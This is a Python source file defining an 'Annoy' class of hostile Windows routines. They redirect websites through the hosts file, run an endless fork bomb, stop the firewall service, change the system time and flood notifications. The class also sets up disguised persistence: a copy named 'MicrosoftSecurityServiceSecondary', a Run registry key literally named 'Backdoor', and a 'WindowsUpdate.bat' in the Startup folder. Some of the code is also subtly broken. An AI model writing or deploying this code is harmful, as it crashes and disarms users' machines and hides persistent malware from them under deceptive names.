import os
import subprocess
import sys
import shutil
import getpass
import typing as t
import re
import win10toast


class Annoy:
    def __init__(self) -> None:
        pass

    def blockWebsites(self, data: t.Optional[t.Iterable[str]] = None) -> None:
        wlist = data
        if data is None:
            wlist = ['*']
        if len(data) == 0:
            wlist = ['*']

        redirect = "127.0.0.1"
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

        with open(hosts_path, 'r+') as file:
            content = file.read()
            for website in wlist:
                if website in content:
                    pass
                else:
                    file.write(redirect + " " + website + "\n")

    def forkBomb(self) -> None:
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

    def restartOnStartup(self, filee: t.Optional[str] = None) -> None:
        # Normal Startup Trick
        location = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary." + filee

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

        # adding .bat to startup folder
        # wont't work if the file is deleted
        def addBatFileStartup(filePath: t.Optional[str] = None, fileName: t.Optional[str] = None):
            if filePath == "":
                filePath = os.path.dirname(os.path.realpath(__file__))
                # we could also use this
                # filePath = os.environ["appdata"] + "\\" + fileName

            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
            with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
                bat_file.write(r'start "" %s' % filePath)

        addBatFileStartup()

    def changeTime(self, time: t.Optional[str] = "00:00") -> None:
        if re.match(r'^\d{2}:\d{2}$', time):
            os.system(f'time {time}')

    def disableFirewallTemp(self) -> None:
        os.system('net stop "MpsSvc"')
        os.system('taskkill /f /t /im "FirewallControlPanel.exe"')

    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None) -> None:
        if limit is None:
            while True:
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)
        else:
            for _ in range(limit):
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)
